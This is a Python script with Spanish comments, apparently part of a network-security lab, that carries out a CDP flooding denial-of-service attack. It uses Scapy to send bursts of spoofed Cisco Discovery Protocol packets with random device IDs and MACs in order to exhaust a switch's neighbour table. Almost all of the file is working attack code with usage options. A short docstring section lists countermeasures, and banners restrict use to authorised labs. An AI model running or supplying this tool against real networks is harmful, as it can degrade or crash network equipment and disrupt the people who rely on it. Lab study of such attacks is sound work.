#!/usr/bin/env python3
"""
=============================================================================
LABORATORIO DE SEGURIDAD EN REDES - SCRIPT 01
Ataque: DoS mediante CDP (Cisco Discovery Protocol) Flooding
=============================================================================
DESCRIPCIÓN:
    Este script realiza un ataque de Denegación de Servicio (DoS) contra
    dispositivos de red que tienen CDP habilitado. CDP es un protocolo
    propietario de Cisco que opera en Capa 2 y permite descubrir dispositivos
    vecinos automáticamente.

    El ataque consiste en inundar el switch/router con paquetes CDP falsos
    generados con información de dispositivo aleatoria, lo que agota la
    tabla de vecinos CDP del dispositivo objetivo y puede causar una
    degradación severa del rendimiento o reinicio del dispositivo.

CÓMO FUNCIONA:
    1. Scapy construye paquetes CDP legítimos pero con datos falsos.
    2. Se generan IDs de dispositivo, plataformas y versiones aleatorios.
    3. Los paquetes se envían en ráfagas a la dirección multicast CDP.
    4. El switch objetivo intenta procesar cada vecino nuevo, agotando
       la memoria y CPU destinadas al procesamiento CDP.

REQUISITOS:
    - Python 3.8+
    - Scapy: pip install scapy
    - Permisos root/administrador
    - Interfaz de red en la misma red capa 2 que el objetivo

USO:
    sudo python3 cdp_dos.py -i eth2 -c 1000 -d 0.001

PARÁMETROS:
    -i / --interface   : Interfaz de red de origen (ej: eth0, ens33)
    -c / --count       : Número de paquetes CDP a enviar (default: 500)
    -d / --delay       : Retardo en segundos entre paquetes (default: 0.005)
    -v / --verbose     : Mostrar detalles de cada paquete enviado

CONTRA-MEDIDAS:
    - Deshabilitar CDP en puertos de acceso: 'no cdp enable' (interfaz)
    - Deshabilitar CDP globalmente si no es necesario: 'no cdp run'
    - Usar LLDP en su lugar con autenticación
    - Implementar Port Security para limitar tramas en el puerto
    - Monitorear logs del switch para alertas de CDP flooding
=============================================================================
"""

import argparse
import random
import string
import sys
import time

try:
    from scapy.all import (
        Ether, LLC, SNAP, sendp, get_if_hwaddr, conf
    )
    from scapy.contrib.cdp import (
        CDPv2_HDR, CDPMsgDeviceID, CDPMsgSoftwareVersion,
        CDPMsgPlatform, CDPMsgPortID
    )
except ImportError:
    print("[!] Scapy no está instalado. Ejecutar: pip install scapy")
    sys.exit(1)

# ─── Colores para terminal ───────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def banner():
    print(f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║          CDP DoS FLOOD ATTACK - LABORATORIO DE SEGURIDAD     ║
║               ¡SOLO PARA USO EDUCATIVO Y AUTORIZADO!         ║
╚══════════════════════════════════════════════════════════════╝
{RESET}""")

def rand_str(length=8):
    """Genera una cadena aleatoria para IDs de dispositivo."""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def rand_mac():
    """Genera una dirección MAC aleatoria."""
    return ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])

def build_cdp_packet(src_mac: str) -> bytes:
    """
    Construye un paquete CDP falso con información aleatoria.
    
    Estructura del paquete:
      Ethernet → LLC (DSAP/SSAP = 0xAA) → SNAP → CDP Header → TLVs
    
    Los TLVs (Type-Length-Value) incluidos:
      - Device ID  : Nombre del "dispositivo" falso
      - Software   : Versión de IOS falsa
      - Platform   : Modelo de plataforma falso
      - Port ID    : Puerto de origen falso
    """
    fake_mac  = rand_mac()
    device_id = f"ROUTER-{rand_str(6)}"
    platform  = random.choice(["Cisco 2960", "Cisco 3750", "Cisco 4500", "Cisco 7200"])
    ios_ver   = f"12.{random.randint(1,4)}.{random.randint(1,9)}T"
    port_id   = f"GigabitEthernet0/{random.randint(0,48)}"

    pkt = (
        Ether(src=fake_mac, dst="01:00:0c:cc:cc:cc") /
        LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
        SNAP(OUI=0x00000C, code=0x2000) /
        CDPv2_HDR(
            vers=2,
            ttl=180,
        ) /
        CDPMsgDeviceID(val=device_id) /
        CDPMsgSoftwareVersion(val=f"Cisco IOS Software, Version {ios_ver}") /
        CDPMsgPlatform(val=platform) /
        CDPMsgPortID(iface=port_id)
    )
    return pkt

def cdp_flood(interface: str, count: int, delay: float, verbose: bool):
    """
    Función principal de ataque CDP flooding.
    
    Args:
        interface: Nombre de la interfaz de red
        count    : Cantidad de paquetes a enviar
        delay    : Tiempo de espera entre paquetes (segundos)
        verbose  : Imprimir detalles por paquete
    """
    print(f"{CYAN}[*] Iniciando CDP DoS Flood en interfaz: {interface}{RESET}")
    print(f"{CYAN}[*] Paquetes a enviar: {count} | Delay: {delay}s{RESET}\n")

    try:
        src_mac = get_if_hwaddr(interface)
    except Exception as e:
        print(f"{RED}[!] Error obteniendo MAC de {interface}: {e}{RESET}")
        sys.exit(1)

    sent = 0
    start = time.time()

    for i in range(count):
        try:
            pkt = build_cdp_packet(src_mac)
            sendp(pkt, iface=interface, verbose=False)
            sent += 1

            if verbose:
                device = pkt[CDPMsgDeviceID].val.decode() if hasattr(pkt[CDPMsgDeviceID].val, 'decode') else pkt[CDPMsgDeviceID].val
                print(f"{GREEN}[+] Paquete {i+1:04d}/{count} enviado → DeviceID: {device}{RESET}")
            elif i % 50 == 0:
                elapsed = time.time() - start
                rate = sent / elapsed if elapsed > 0 else 0
                print(f"{YELLOW}[~] Progreso: {sent}/{count} paquetes | {rate:.1f} pkt/s{RESET}")

            time.sleep(delay)

        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Ataque interrumpido por el usuario.{RESET}")
            break

    elapsed = time.time() - start
    print(f"\n{GREEN}{BOLD}[✓] Ataque completado:{RESET}")
    print(f"    Paquetes enviados : {sent}")
    print(f"    Tiempo total      : {elapsed:.2f}s")
    print(f"    Tasa promedio     : {sent/elapsed:.1f} pkt/s")

def main():
    banner()
    parser = argparse.ArgumentParser(
        description="CDP DoS Flood - Laboratorio de Seguridad en Redes",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="ADVERTENCIA: Solo usar en entornos de laboratorio autorizados."
    )
    parser.add_argument("-i", "--interface", required=True,
                        help="Interfaz de red de salida (ej: eth0)")
    parser.add_argument("-c", "--count", type=int, default=500,
                        help="Número de paquetes CDP a enviar (default: 500)")
    parser.add_argument("-d", "--delay", type=float, default=0.005,
                        help="Delay entre paquetes en segundos (default: 0.005)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Mostrar detalles de cada paquete")

    args = parser.parse_args()

    cdp_flood(
        interface=args.interface,
        count=args.count,
        delay=args.delay,
        verbose=args.verbose
    )

if __name__ == "__main__":
    main()
